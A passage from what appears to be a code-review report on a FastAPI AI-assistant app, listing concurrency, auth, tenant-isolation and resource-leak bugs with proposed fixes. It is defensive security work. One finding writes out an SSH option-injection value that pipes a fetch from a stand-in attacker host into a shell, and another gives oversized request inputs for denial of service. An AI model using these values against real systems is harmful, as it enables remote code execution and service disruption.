detail: In _run_shell, when asyncio.wait_for times out, proc.kill() is called and the function returns immediately without awaiting proc.wait() (or proc.communicate()). The killed child process is left as a zombie until GC, and the pipe transports/file descriptors are not deterministically closed, leaking FDs. Under repeated timeouts (e.g. an unreachable ssh host hitting the 15s timeout many times) this accumulates zombie processes and open descriptors. Failure scenario: agent repeatedly polls /cookbook/output for a task on a dead/hanging host -> each call leaks a killed-but-unreaped subprocess and its pipes.
fix: After proc.kill(), await the process: `try: await asyncio.wait_for(proc.wait(), timeout=2) except Exception: pass` (or await proc.communicate()) before returning, so the child is reaped and transports closed.

title: Lost-update race in audit_memories: memories added during the 120s LLM call are silently deleted on save
detail: audit_memories() snapshots the store at line 506 (existing = memory_manager.load(owner=owner)), then awaits llm_call_async with timeout=120 (line 540), then writes the store back at line 637 from that stale snapshot. extract_and_store runs as a fire-and-forget asyncio task after every chat response, and users can add memories via the API at any time. Concrete scenario: the audit fires (triggered at line 475), and while the LLM spends 30-120s generating, the same user's other session runs extract_and_store, which does its own load_all() -> save() (lines 388/461, no await in between so it completes fully) and persists 2 new facts. When the audit resumes, final_entries is built only from the pre-await snapshot; the owner-merge at lines 627-634 keeps only OTHER owners' entries, so the 2 new facts for the audited owner are dropped by memory_manager.save(saved_entries) at line 637. Worse, when owner is None (line 636), saved_entries = final_entries replaces the ENTIRE file from the stale snapshot, deleting any entry any user added during the window. store.save() is an atomic os.replace, so the write is clean but the deletion is permanent, and the vector rebuild at line 647 erases them from the index too. The 50%-cut safety net (line 618) only compares against the stale before_count, so it never catches this.
fix: Serialize store mutations with a module/manager-level asyncio.Lock held across load->save in both extract_and_store and audit_memories, or (cheaper) re-load the store after the LLM call and preserve any entry whose id is absent from the pre-await snapshot (i.e. only apply the audit to ids that existed when the snapshot was taken, keep everything newer).

title: Synchronous embedding + ChromaDB calls block the event loop inside async functions; rebuild re-embeds the whole store per audit
detail: memory_vector.rebuild(saved_entries) at line 647 is fully synchronous (src/vector/memory_vector.py:187): it deletes and recreates the Chroma collections, then calls lane.encode() on every memory text across all embedding lanes in 100-item batches — CPU-bound (fastembed) or blocking-network (custom lane) work with no await. It is invoked from async audit_memories, which runs on the FastAPI event loop (extract_and_store is 'designed to run as a background task (asyncio.create_task)' — same loop as request handlers). With a few hundred memories this freezes ALL HTTP requests and streaming responses for seconds every 5 extractions (AUDIT_INTERVAL). The same applies per-fact to memory_vector.find_similar (line 412) and memory_vector.add (line 454) — each is a synchronous embed + Chroma query executed on the loop after every chat response — and to the synchronous json load/save of the whole memory file (lines 388, 461, 506, 637).
fix: Wrap the blocking calls in await asyncio.to_thread(...): the rebuild at line 647, find_similar at 412, add at 454, and the memory_manager.load/save calls; combined with the locking fix above so threaded writes stay serialized.

title: Missing tenant scoping when session has no owner: audit rewrites all users' memories and sends them to one LLM prompt
detail: _owner = getattr(session, 'owner', None) (line 386) explicitly tolerates owner-less sessions, and MemoryStore.load(owner=None) returns EVERY user's entries (src/memory/store.py:128-133). Consequences when an owner-less session trips the audit threshold (line 472): (1) audit_memories(owner=None) serializes all tenants' private memories into a single LLM user message (line 537) — cross-tenant data exposure to whatever endpoint_url/model that session is configured with, which can be a user-selected/remote endpoint; (2) the save path takes the else branch at line 636 (owner is falsy), so saved_entries = final_entries replaces the entire multi-tenant store with the LLM's output — the model merging or dropping another tenant's entries deletes them for real, and the 50% guard at line 618 only blocks global catastrophes (a small tenant can be fully wiped while staying above 50% overall). Additionally, in extract_and_store the text-dedup at line 430 falls back to 'existing' (all tenants) when _owner is None, so one user's new fact can be silently suppressed because a DIFFERENT user already has a similar memory.
fix: In extract_and_store, skip the audit trigger (and scope dedup to owner-is-None entries only) when _owner is None; in audit_memories, refuse to run with owner=None (or iterate per distinct owner), so cross-tenant data never enters one prompt and the whole-store replacement branch is unreachable.

title: Non-atomic read-modify-write of memory_tidy_state.json
detail: _save_tidy_state loads the whole sidecar dict, mutates one owner's key, and rewrites the file in place (open(path,'w') at line 65 — no tmp+os.replace, unlike store.save at src/memory/store.py:209-212). Two audits finishing near-simultaneously for different owners lose one fingerprint (that owner's next audit needlessly re-runs the 30-120s LLM pass the fingerprint exists to avoid), and a crash mid-write leaves a truncated JSON file (recovered as {} by _load_tidy_state, again discarding all fingerprints). Low impact — the failure mode is wasted LLM time, not data loss — but it defeats the stated purpose of the short-circuit.
fix: Write to path + '.tmp' and os.replace() like store.save does; if the audit calls get moved off-loop via to_thread, also guard load/modify/write with the same lock used for the memory store.

title: Corrupt/unreadable auth.json fails open into first-run setup, allowing unauthenticated admin takeover
detail: _load() catches every exception (JSON decode error, permission error, transient I/O error) and sets self._config = {}. That makes is_configured return False, which re-arms setup() (line 200): the first-run path only requires that no users exist. Failure scenario: auth.json is corrupted by a crash mid-manual-edit or a disk error; on next process start the app silently reverts to 'first-run setup required' and ANY unauthenticated visitor can call setup() to create a brand-new admin account. The first subsequent _save() then overwrites the original auth.json, permanently destroying all real accounts. A parse error must not be treated the same as 'file does not exist'.
fix: Fail closed: only fall back to self._config = {} when the file does not exist. If the file exists but cannot be read/parsed, set a self._load_failed flag (or re-raise to abort startup) and make is_configured / setup() refuse while that flag is set, e.g. `except Exception: logger.critical(...); self._load_failed = True; raise` or have setup() return False when _load_failed.

title: _save_sessions writes sessions.json outside the lock; concurrent savers share one temp filename, corrupting the file and resurrecting revoked tokens
detail: _save_sessions() takes the snapshot under _sessions_lock but calls _atomic_write_json AFTER releasing it (lines 141-143), and several callers (create_session_trusted line 470, revoke_token line 526, delete_user line 260) invoke it outside the lock too. Two failure scenarios: (1) Lost/stale write: thread A revokes a deleted user's tokens and snapshots state without them; thread B (a concurrent login) snapshotted earlier WITH the revoked tokens; B's write lands after A's, so sessions.json persists the revoked tokens and they come back to life for the deleted user after the next restart (_load_sessions only prunes by expiry). (2) File corruption: atomic_write_json uses a temp name keyed only by PID (`sessions.json.tmp.<pid>`), so two threads of the same process writing concurrently open and json.dump into the SAME temp file, producing interleaved/invalid JSON or an os.replace FileNotFoundError; _load_sessions then fails on next start and drops all sessions.
fix: Perform the write while holding the lock: move `_atomic_write_json(self._sessions_path, snapshot)` inside the `with self._sessions_lock:` block (the RLock makes this safe for revoke_user_sessions which already saves under the lock). Alternatively serialize writes with a dedicated write lock plus a monotonic version counter to drop stale snapshots.

title: Backup-code check-then-remove in totp_verify is non-atomic; concurrent reuse crashes with unhandled ValueError
detail: totp_verify reads the shared backup-codes list and evaluates `code in backup` (line 419) OUTSIDE _config_lock, then acquires the lock and calls backup.remove(code) (line 421). Two concurrent login requests replaying the same backup code can both pass the membership check; the first remove() succeeds, the second raises ValueError inside the lock, which propagates out of totp_verify as an unhandled exception (HTTP 500) instead of a clean False. Both requests also raced on the same list object mutated in place. The check-outside/mutate-inside pattern is a classic non-atomic read-modify-write on shared module-instance state.
fix: Move the whole check into the lock and guard the removal: `with self._config_lock: backup = self._config['users'][username].get('totp_backup_codes', []);  if code in backup: backup.remove(code); self._save(); return True`. While there, store backup codes hashed (e.g. sha256) and compare with hmac.compare_digest instead of keeping them plaintext in auth.json and using `in` (timing-variable, plaintext at rest alongside the TOTP secret).

title: Expired sessions are never swept: _sessions dict and sessions.json grow unboundedly for process lifetime
detail: Expired tokens are removed only when that exact token is presented again (validate_token/get_username_for_token) or at process restart (_load_sessions prune). A token whose browser never returns (cleared cookies, abandoned device, script-driven logins via create_session) stays in self._sessions and is re-serialized into sessions.json on every subsequent save, forever, even long after its 7-day expiry. On a long-running server with regular logins this is monotonic memory growth plus ever-larger full-file JSON rewrites on every single login/logout (each _save_sessions dumps the entire dict).
fix: Sweep on write: in _save_sessions (or at the top of create_session_trusted), drop entries with expiry <= time.time() under the lock before snapshotting, e.g. `now = time.time(); self._sessions = {t: s for t, s in self._sessions.items() if s.get('expiry', 0) > now}`.

title: delete_user swallows API-token revocation failure with a detail-free warning while still reporting success
detail: The `except Exception:` at line 271 catches any failure of the ApiToken purge (DB locked, import error, schema drift) and logs only a generic warning with no exception detail (no exc_info / no message), then delete_user proceeds to return True. Per the function's own comment (lines 261-264), the bearer-token path never re-checks that the owner exists, so on this silent failure the 'deleted' user retains full API access indefinitely, and the admin sees a successful deletion. The security-relevant step can fail invisibly.
fix: Log the actual error and surface the failure: `except Exception: logger.exception(f"Failed to revoke API tokens for deleted user '{username}'")`, and either retry, or propagate a partial-failure signal to the caller (e.g. return a status the route can report) instead of unconditionally returning True.

title: change_password/totp_disable verify credentials outside _config_lock then index the user unguarded — concurrent delete_user causes KeyError 500
detail: change_password checks membership and the current password (lines 349-352) before acquiring _config_lock, then does self._config['users'][username][...] = ... at line 354 without re-checking. totp_disable has the same shape (verify at 432, unguarded .pop/[] at 435-438). If an admin deletes the user between the check and the locked write, the indexing raises KeyError, which escapes as an unhandled 500 instead of returning False.
fix: Re-validate inside the lock: `with self._config_lock: user = self._config.get('users', {}).get(username);  if user is None: return False;  user['password_hash'] = _hash_password(new_password); self._save()`. Apply the same pattern in totp_disable (and totp_confirm_enable, line 395, which has the same unguarded index after an unlocked check).

title: _migrate_single_user does not lowercase the legacy username, locking the migrated admin out until next restart
detail: _load() normalizes existing user keys to .strip().lower() (lines 109-113), but the single-user migration that runs AFTER _load builds the new users dict with the raw legacy value (`old_user = self._config.get('username', 'admin')`, line 150). A legacy config with username 'Admin' migrates to users key 'Admin', while verify_password lowercases the login input to 'admin' and finds nothing — the sole admin cannot log in for the entire first post-migration run (fixed only by restarting so _load re-normalizes the keys).
fix: Normalize during migration: `old_user = str(self._config.get('username', 'admin')).strip().lower()`.

title: Blocking synchronous web search executed inside the async research path, stalling the event loop
detail: _handle_research_failure is a sync method that calls comprehensive_web_search(query) (line 429) — confirmed in services/search/core.py to be a synchronous function doing provider HTTP calls with retries plus multi-page content fetching. It is invoked from async code: call_research_service (async, line 297) -> _fallback_research (async, line 320) -> _handle_research_failure. When DeepResearcher fails (e.g. LLM endpoint down — exactly the condition triggering fallback), the entire event loop is blocked for the full duration of the search (network timeouts can be tens of seconds), freezing every other request, SSE stream, and background task in the FastAPI process. Contrast: the legacy-engine fallback at lines 310-312 correctly uses run_in_executor.
fix: Make _handle_research_failure async and off-load the call: `search_result = await asyncio.get_running_loop().run_in_executor(None, comprehensive_web_search, query)`; update the call site at line 320 to `return await self._handle_research_failure(...)`.

title: Synchronous file I/O on the event loop in _save_result and the disk-fallback getters
detail: _save_result (path.write_text, line 227) runs inside the async _run coroutine, and get_status/get_result/get_sources (read_text at lines 121, 158, 178) are sync methods called from async FastAPI routes. Research reports with full findings can be hundreds of KB to MB of JSON; each write/read blocks the event loop for the duration of the disk operation. Failure scenario: on a loaded server with slow/networked storage, every research completion or status poll that falls through to disk momentarily stalls all concurrent requests.
fix: Off-load with `await loop.run_in_executor(None, path.write_text, json.dumps(data), ...)` in the async path (or anyio.to_thread.run_sync); for the sync getters, keep them sync but have async routes call them via run_in_executor, or serialize once and keep payloads small.

title: Bare `except Exception: pass` on persisted-result reads silently masks corruption
detail: get_status (lines 128-129), get_result (160-161), get_sources (180-181), and clear_result (205-206) swallow all exceptions with no logging. Failure scenario: a research JSON on disk is corrupted (partial write from a crash mid write_text, disk full, bad encoding) — the user's completed research silently returns None/404 with zero diagnostic trace, and clear_result can silently fail to delete (unlink PermissionError), leaving stale results that get_result keeps serving.
fix: Replace `pass` with `logger.warning(f"Failed reading research file {path}: {e}")` (and similarly for unlink); optionally quarantine/rename corrupt files so subsequent calls don't re-parse them.

title: Legacy fallback always reports Duration 0.0s — _get_legacy_stats never emits a 'Duration' key
detail: Line 314 computes elapsed from `stats.get("Duration", "0")`, but _get_legacy_stats (lines 322-335) only returns Findings/Sources/Searches/URLs — there is no 'Duration' key, so elapsed is unconditionally 0.0 and every legacy-path report header shows '**Duration:** 0.0s'. Also, _get_legacy_stats returning {} on any exception makes the header show '?' for every stat with no log of why.
fix: Time the legacy run directly around the run_in_executor call (`t0 = time.time(); ...; elapsed = time.time() - t0`) instead of parsing a key that does not exist.

title: Raw internal exception text stored as the user-visible result
detail: On background failure, `entry["result"] = str(e)` (line 100) is later returned verbatim to the client via get_result, and _format_error_response/_handle_research_failure similarly embed the raw error string. Exception messages from httpx/urllib commonly include the full LLM endpoint URL and can include header-dump fragments from library errors — internal infrastructure details disclosed to any client that can poll the session's result.
fix: Store the full exception only in logs (already done at line 99); set the user-facing result to a sanitized message (e.g. 'Research failed: <exception class name>') or pass it through a redaction helper before persisting/returning.

title: Shared diffusion pipelines used concurrently from threadpool without any lock
detail: All endpoints are sync 'def', so FastAPI/Starlette runs them on the threadpool, meaning /v1/images/generations, /v1/images/inpaint and /v1/images/harmonize can genuinely execute in parallel threads. They all invoke the same module-global '_pipe' / '_inpaint_pipe' / '_img2img_pipe' objects with no lock or semaphore. Diffusers pipelines are not thread-safe: the scheduler's timestep state is mutated during __call__, so two overlapping requests corrupt each other's denoising schedules (garbage/blended images) or crash with CUDA errors, and concurrent requests double VRAM pressure causing OOM aborts of both requests. Additionally '_get_inpaint_pipe' (lines 556-638) does an unlocked lazy check-then-load of the globals: two simultaneous first inpaint requests both see '_inpaint_pipe is None' and both run cls.from_pipe/from_pretrained, loading a second multi-GB pipeline copy (VRAM leak / OOM). Same non-atomic pattern at line 688 with the '_ge_vae_upcast' flag.
fix: Add a module-level threading.Lock (or Semaphore(1)) and hold it around every pipeline __call__ in generate_image, inpaint_image, harmonize_image and _legacy_whole_image_harmonize, and around the lazy-init body of _get_inpaint_pipe (double-checked: re-test _inpaint_pipe/_img2img_pipe after acquiring).

title: Unvalidated n, width, height allow unbounded GPU work and memory growth per request
detail: ImageRequest performs no bounds checks: 'n' (line 118) is any int and drives 'for _ in range(req.n)' at line 502, and 'size' is split into arbitrary width/height at lines 485-486. A single POST with {"n": 100000} or {"size": "16384x16384"} makes the handler run diffusion inference for hours while appending every full-resolution PNG as a base64 string to the in-process 'images' list (line 531) — memory grows without bound (each 1024x1024 PNG b64 is ~2-4 MB, so n=10000 is tens of GB of heap) and the threadpool worker is pinned, starving all other requests. Oversized width/height also triggers immediate CUDA OOM that can destabilize the loaded model. InpaintRequest.steps (line 548) is similarly unclamped (steps=100000 pins the GPU).
fix: Clamp inputs before use: n = max(1, min(req.n, 4)); reject or clamp width/height to a sane box (e.g. 64..2048, multiples of 8) returning HTTP 400 via HTTPException; clamp steps to e.g. 1..75. Consider streaming/limiting response size for multi-image requests.

title: No authentication on GPU inference endpoints; bind address is auto-added to the TrustedHost allowlist
detail: No endpoint checks any API key or token despite the server exposing expensive GPU inference and accepting arbitrary attacker-supplied images (inpaint/harmonize). The only guards are TrustedHost + loopback bind. But _compute_allowed_hosts inserts the raw bind_host into the Host-header allowlist (line 71), so the moment an operator runs '--host 0.0.0.0' (the natural way to serve another machine), any remote client can pass the TrustedHost check simply by sending 'Host: 0.0.0.0', getting unauthenticated use of the GPU (cost/DoS) and the ability to feed images/prompts into the pipeline. TrustedHostMiddleware is thereby reduced to a speed bump exactly in the non-loopback deployment it was meant to protect.
fix: Do not add wildcard-ish bind addresses to allowed_hosts — skip '0.0.0.0', '::' and '' when building the list (operators must pass real hostnames via --allowed-host). Add an optional shared-secret check (e.g. --api-key / API_KEY env, compared with hmac.compare_digest against the Authorization header) enforced on all POST endpoints, and require it when the bind host is non-loopback.

title: except TypeError capability-dispatch conflates real bugs with missing pipeline features
detail: inpaint_image (line 727), its inner fallback (line 803) and _legacy_whole_image_harmonize (line 1111) use bare 'except TypeError' to detect 'pipeline does not accept image/mask_image kwargs'. TypeError raised for any other reason inside the pipeline call — a diffusers version renaming a kwarg, a bad tensor dtype/shape operation deep in the model, or the deliberate raise at line 714 pattern being copied incorrectly — is silently reinterpreted as 'no inpaint support' and the request falls through to crop+img2img or plain txt2img. The client receives HTTP 200 with an image that ignores their mask/init image, with no error surfaced; the only trace is an INFO log line. Failures are effectively swallowed and converted into wrong-but-plausible output.
fix: Detect capability up front instead of by exception: inspect.signature(pipe.__call__).parameters to check for 'mask_image'/'image' support, or catch TypeError only when str(e) mentions the unexpected-keyword argument ('unexpected keyword argument'), re-raising otherwise.

title: Error conditions returned as HTTP 200 bodies
detail: generate_image, inpaint_image and harmonize_image return {"error": "Model not loaded"} (lines 481, 645, 991) with status 200. OpenAI-compatible clients (including Atenea's image tool) key off HTTP status; a 200 with an unexpected shape typically surfaces as a confusing KeyError ('data'/'b64_json' missing) far from the real cause, or worse is treated as success and cached. Note the lifespan handler raises on load failure so in the normal startup path this is unreachable, but it fires when the module is imported and served directly (e.g. 'uvicorn scripts.diffusion_server:app', where _args is also None and _args.width at line 488 raises AttributeError -> raw 500).
fix: raise fastapi.HTTPException(status_code=503, detail="Model not loaded") instead of returning an error dict; guard _args being None with an explicit startup check.

title: Data race on module-global remote context across concurrent requests
detail: _remote_host/_remote_port/_remote_platform/_last_gpu_error are module globals mutated by detect_system (set at lines 630-632, reset at 717-718) and read by every _run/_detect_* helper. FastAPI dispatches the sync endpoints get_system/get_models (routes/hwfit_routes.py:104,111 — plain `def`) onto its anyio worker threadpool, so multiple detect_system calls run concurrently in-process. Failure scenario: request A (host='user@server') sets _remote_host and begins its sequence of _run() SSH probes; request B (local, host='') runs detect_system and sets _remote_host=None (or a different host). A's remaining _run() calls now read _remote_host=None and probe the LOCAL box instead of the remote one — and A caches those local results under the remote host's cache key (line 719), so a remote-hardware query returns and permanently caches this server's own hardware. _last_gpu_error (line 122) likewise gets attached to whichever result reads it next.
fix: Stop using module globals for per-call context. Thread the remote context (host, port, platform) explicitly through _run and the _detect_* helpers as parameters (e.g. a small dataclass/namedtuple passed down), or hold it in a threading.local(). If a quick fix is required, wrap the body of detect_system in a module-level threading.Lock() so only one detection runs at a time, but the parameter-threading refactor is preferred since SSH probes are slow and a global lock serializes all callers.

title: SSH option injection via user-controlled host argument
detail: _run passes _remote_host (from the client-supplied `host` query param, routes/hwfit_routes.py:104 -> detect_system(host=...) -> _remote_host) into run_ssh_command, which builds the argv in _ssh_exec_argv (core/platform_compat.py:381) by appending `remote` with no `--` end-of-options separator. Because the target is placed as a bare argv token, a host string beginning with '-' is parsed by ssh as an option. Failure scenario: host='-oProxyCommand=curl http://attacker/x|sh' causes the local ssh client to execute ProxyCommand — arbitrary command execution on the server running Atenea (also enables SSRF/redirection of the connection). No shell is involved, so shlex doesn't help; this is classic argv option injection.
fix: Insert a '--' separator before the remote target in _ssh_exec_argv (argv.append('--'); argv.append(remote)) so ssh never treats the host as an option, and additionally validate the host in detect_system (reject values starting with '-', enforce a user@host:port allowlist pattern) before assigning _remote_host.

title: Unbounded, never-evicted detection cache keyed on user-supplied host
detail: _cache_by_host grows one permanent entry per (host, ssh_port, platform) tuple and is never pruned. host/ssh_port/platform come straight from client query params (routes/hwfit_routes.py:104). Failure scenario: a client repeatedly calls /api/hwfit/system with distinct host strings (e.g. host='a', 'b', 'c', ... or varying ports) — each mints a new dict entry that lives for the life of the process. Even legitimately, stale entries past CACHE_TTL are kept forever rather than evicted (the TTL only gates reuse, line 627), so memory only grows. Over a long-running server this is an unbounded memory leak driven by external input.
fix: Bound the cache: use a collections.OrderedDict with an LRU cap (e.g. maxlen ~256, popitem(last=False) on overflow), and/or drop entries whose timestamp is older than CACHE_TTL when scanning. At minimum delete the expired entry when the TTL check at line 627 fails instead of leaving it resident.

title: Fail-open privilege check for X-Atenea-Owner impersonated user
detail: In research_start, when the caller authenticates as 'internal-tool' and supplies an X-Atenea-Owner header, the can_use_research privilege check for that impersonated user is wrapped in `except Exception: pass` (lines 398-399). If auth_mgr.get_privileges(tool_owner) raises for any reason (DB hiccup, malformed privilege row, transient auth-store error), the check is silently skipped and execution falls through to `user = tool_owner` — the research job launches on behalf of a user whose can_use_research privilege was never verified, spending that user's endpoint quota. Concrete scenario: privileges table locked by a concurrent write (SQLite 'database is locked') at the moment an internal tool starts research for a research-disabled account → the 403 that should fire is bypassed.
fix: Fail closed: replace `except Exception: pass` with `except Exception: raise HTTPException(503, "Privilege check unavailable")` (or at minimum log at error level and reject when auth is configured).

title: Panel-launched research entries accumulate forever in _active_tasks
detail: research_start creates rp-* sessions and the panel consumes them via /api/research/result-peek (line 503) and the SSE stream — neither ever calls research_handler.clear_result(), which is the ONLY code path that pops entries from _active_tasks (verified: src/research/handler.py:567 is the sole pop; only the chat-flow /api/research/result at line 193 calls it). Each completed entry retains the full result text, progress dict, and the live `researcher` object with all findings/evolving report (can be MBs per run). Concrete scenario: a long-lived server where users run panel research daily — process RSS grows monotonically with every completed/errored run until restart, and /api/research/active iterates an ever-growing dict on every poll.
fix: After the panel flow finishes, release the entry: e.g., in the SSE generator's terminal branch (line 489-494) or in result_peek once the result is persisted on disk, call research_handler.clear_result(session_id) (result is already saved to the JSON by _save_result), or add a TTL sweep that pops entries with status != 'running' older than N minutes.

title: research_library does blocking full-directory scan and full-JSON parse inside async handler
detail: research_library is `async def` but synchronously globs DEEP_RESEARCH_DIR and json.loads() EVERY report file on EVERY request (lines 264-292), across all users, only to emit a small metadata dict per item. Research JSONs contain the full report text, sources, and raw_findings, so each can be hundreds of KB to MBs. Concrete scenario: 500 accumulated reports averaging 1 MB → every Library-panel poll parses ~500 MB of JSON on the event-loop thread, stalling ALL other requests (including SSE streams at line 495, which then burst) for seconds per call. The same blocking-read pattern (path.read_text in async def) exists in _owns_in_memory (139), _assert_owns_research (203), research_detail (316), research_archive (333/337), research_delete (355), result_peek (514), and spinoff (555), but those touch a single file; the library scan is the O(n·filesize) hot path.
fix: Offload the scan with `await asyncio.to_thread(...)`, and stop parsing whole reports for a listing: maintain a lightweight index (sidecar .meta.json per report, or an owner-keyed index file updated on save/archive/delete) so the listing reads only metadata.

title: Synchronous SQLAlchemy sessions block the event loop in async handlers
detail: research_start (lines 404-417 and 432-445) and research_spinoff (lines 599-616) open a sync SessionLocal() and run queries directly inside `async def` handlers; resolve_endpoint() (called at lines 420-430, 590-594) also opens sync DB sessions internally (src/runtime/endpoint_resolver.py:276,328). On SQLite, a concurrent writer holding the lock makes these queries stall for the busy-timeout duration while the entire event loop is frozen — every other request, including all active SSE research streams, stops being served. Sessions ARE properly closed via try/finally, so no connection leak.
fix: Wrap the DB-touching blocks in `await asyncio.to_thread(...)` (e.g., extract the endpoint-resolution fallback chain into a sync helper and call it via to_thread), or move to async SQLAlchemy sessions.

title: Non-atomic read-modify-write of research JSON loses concurrent updates
detail: research_archive reads the JSON, mutates one key, and rewrites the whole file with plain write_text (lines 333-337) — no lock and no atomic replace. hide_image/unhide_all_images and the handler's _save_result write the same file. Concrete scenario: user clicks Archive while a re-run of the same session is completing — _save_result and the archive write interleave, so either the archived flag is silently lost or the freshly saved result/sources are overwritten with the stale pre-completion copy the archive handler read. write_text is also non-atomic, so a crash mid-write leaves truncated JSON, after which every ownership check in this file (e.g. _assert_owns_research line 203-205) treats the report as 404 — the report becomes permanently invisible to its owner.
fix: Write via temp-file + os.replace for atomicity, and serialize mutations per session_id (e.g., a module-level dict of asyncio.Lock keyed by session id, or route all JSON mutation through the handler which already owns the write path).

title: Unguarded json.loads in result-peek turns a corrupt report file into a 500
detail: research_result_peek falls back to disk with `d = json.loads(p.read_text(...))` with no try/except — the only disk-read in the file without one. A truncated/corrupt JSON (e.g. produced by the non-atomic write in the archive finding) makes the panel's result poll return an unhandled 500 with a JSONDecodeError instead of a clean 404, and the client retry loop keeps hammering the same 500.
fix: Wrap in try/except and raise HTTPException(404, "No research result available") on parse failure, matching _assert_owns_research's handling.

title: Blocking DNS lookup, subprocess, and sync DB queries execute inside async handlers
detail: resolve_url() -> _resolve_tailscale_host() performs socket.getaddrinfo (line 102, can block up to ~30s on a slow/failing resolver) and subprocess.run(['tailscale','status','--json'], timeout=5) (line 110), and resolve_endpoint()/resolve_endpoint_by_id() run sync SQLAlchemy/SQLite queries (lines 276-315, 328-361). These sync functions are called directly from async def coroutines (confirmed call sites: src/actions/builtin.py:121, 607, 882, 1144; src/chat/context_compactor.py). Concrete failure: a user configures an endpoint whose hostname is not in DNS and tailscale is absent/slow — the first resolve_endpoint call for that host freezes the entire FastAPI event loop for up to ~35s (getaddrinfo timeout + 5s subprocess timeout), stalling every concurrent request and websocket in the process.
fix: Make the resolver async (asyncio.get_running_loop().getaddrinfo, asyncio.create_subprocess_exec, run_in_executor for the DB session), or have async callers wrap resolve_endpoint/build_chat_url in await anyio.to_thread.run_sync(...) / loop.run_in_executor(None, ...).

title: Falsy owner ('' or None) silently skips the owner filter, exposing other users' endpoints and API keys
detail: In resolve_endpoint (line 282) and resolve_endpoint_by_id (line 334) the guard is `if owner:` — an empty-string owner (typical value for an unauthenticated/anonymous caller, and this codebase passes owner strings around, e.g. `owner=group_owner or None` in src/actions/builtin.py:121) bypasses owner_filter entirely. The query then matches ANY user's ModelEndpoint by id, and the resolved result includes that endpoint's api_key baked into Authorization/x-api-key headers (build_headers, line 296). Concrete failure: any code path that resolves an endpoint id sourced from user input (e.g. a fallback chain entry {endpoint_id: <victim's id>} in _resolve_fallback_candidates line 403 with owner unset) returns a dispatch tuple carrying the victim's bearer token, letting one tenant burn another tenant's paid API credits.
fix: Distinguish 'system context' from 'missing owner' explicitly: require owner to be a non-None sentinel (e.g. owner: str | SystemScope), apply owner_filter whenever owner is not the explicit system sentinel, and reject empty-string owners (raise or return fallback) instead of treating them as admin.

title: _tailscale_cache is unbounded and never invalidated (permanent negative/stale entries)
detail: The module-level dict _tailscale_cache (line 92) has no TTL, no eviction, and no size bound. Two concrete failures: (1) staleness — a transient DNS blip at first resolution caches hostname->None forever (line 131), so even after the Tailscale peer comes online (or a peer's TailscaleIP changes, line 126) every subsequent request keeps failing/using the dead IP until process restart, with no way to recover; (2) growth — hostnames come from user-editable endpoint base_urls, so every distinct hostname ever configured adds a permanent entry (and each new unresolvable one spawns a `tailscale status` subprocess), growing memory for the life of the process.
fix: Store (value, timestamp) and expire entries after a short TTL (e.g. 60s for negative results, 5-15min for positive), and cap the dict size (LRU via functools.lru_cache over a TTL-keyed helper, or cachetools.TTLCache(maxsize=256)).

title: Unsynchronized check-then-act on shared _tailscale_cache
detail: _resolve_tailscale_host does a non-atomic read (line 97) then a much later write (lines 103/126/131) on the shared module dict with no lock. Under concurrent first-time resolution of the same hostname (multiple worker threads / run_in_executor calls resolving endpoints simultaneously), several threads all miss the cache and each runs its own getaddrinfo plus a 5s `tailscale status` subprocess. No corruption (CPython dict ops are atomic), but N duplicate subprocesses and DNS stalls per cold hostname under load.
fix: Guard the lookup-populate sequence with a threading.Lock (or per-hostname lock / single-flight), e.g. `with _cache_lock:` around the cache check and re-check after acquiring before doing the expensive resolution.

title: Per-entry DB session and query in fallback-chain resolution (N+1)
detail: _resolve_fallback_candidates calls resolve_endpoint_by_id once per chain entry (line 403), and each call opens a fresh SessionLocal, runs its own SELECT, resolves runtime credentials, and closes the session (lines 328-361). A fallback chain of N entries costs N session creations + N queries on every resolution (invoked per chat dispatch via resolve_chat_fallback_candidates). With SQLite this serializes on the write lock under load and multiplies latency for what could be one `WHERE id IN (...)` query.
fix: Accept an optional Session parameter (or open one session in _resolve_fallback_candidates and pass it down), fetching all chain endpoint ids in a single query with `ModelEndpoint.id.in_(ids)` and mapping results back to chain order.

title: Broad except Exception in resolvers logged only at DEBUG hides real failures
detail: resolve_endpoint (lines 311-313) and resolve_endpoint_by_id (lines 357-359) catch bare Exception — including programming errors, schema mismatches, and OperationalError from a locked/corrupt SQLite DB — log at logger.debug (invisible at default INFO level), and silently return the fallback/None. Concrete failure: a migration renames a ModelEndpoint column; every resolution starts throwing, the app silently degrades to fallback URLs (or 'Cannot reach model' errors downstream), and logs contain no visible trace of why the configured endpoint stopped being used.
fix: Narrow the catch (e.g. SQLAlchemyError) and log at warning/exception level with the setting_prefix/ep_id context; let unexpected exceptions propagate or at minimum logger.exception them.

title: edit_document converter crashes on non-dict edit items
detail: In the edit_document branch, the code checks isinstance(edits, list) but then calls edit.get("find", ...) on each item without verifying the item is a dict. Models routinely emit slightly malformed arguments (e.g. {"edits": ["fix typo"]} or {"edits": [[{"find":...}]]}); a string/list item raises AttributeError: 'str' object has no attribute 'get', which propagates out of function_call_to_tool_block and aborts the whole agent stream — exactly the failure mode the non-dict-args guard at lines 1222-1224 was added to prevent. The adjacent suggest_document branch (line 1292) already guards with isinstance(s, dict), so this branch is inconsistently unguarded.
fix: Mirror the suggest_document guard: inside the loop, wrap with `if isinstance(edit, dict):` before calling edit.get(), skipping (or logging a warning for) non-dict items.

title: Raw function-call arguments (may contain API keys/tokens) logged at ERROR level
detail: On a JSON parse failure, logger.error(f"Failed to parse function call arguments for {name}: {arguments}") writes the entire raw argument payload to the log. For tools like manage_endpoints (add takes an `api_key` parameter), manage_mcp (add takes an `env` object that typically carries API keys), and manage_tokens, a truncated/malformed streamed tool call means the user's plaintext credentials land in application logs. Line 1223 has the same pattern for non-dict args (logs args!r at WARNING).
fix: Log only the tool name and payload length/first ~50 chars, or redact known-sensitive keys (api_key, env, token) before logging; e.g. logger.error(f"Failed to parse function call arguments for {name} ({len(arguments)} bytes)").

title: uploads.json index grows without bound: cleanup deletes files but never their index entries
detail: cleanup_old_uploads() (lines 248-284) walks the date directories and os.remove()s files older than 30 days, but never touches uploads.json. Meanwhile every save_upload (lines 553-568, 658-663), get_upload_info (line 350), and duplicate check loads the ENTIRE index into memory with json.load and rewrites the whole file (with fsync) under the global _index_lock. Failure scenario: after months of operation the index accumulates thousands of dead entries pointing at deleted files; every single upload then performs a full multi-MB JSON parse + serialize + fsync while holding _index_lock, serializing all uploads across threads and driving latency up linearly forever. Dead entries are only pruned lazily, one hash-collision at a time, in the dedupe path (lines 563-571).
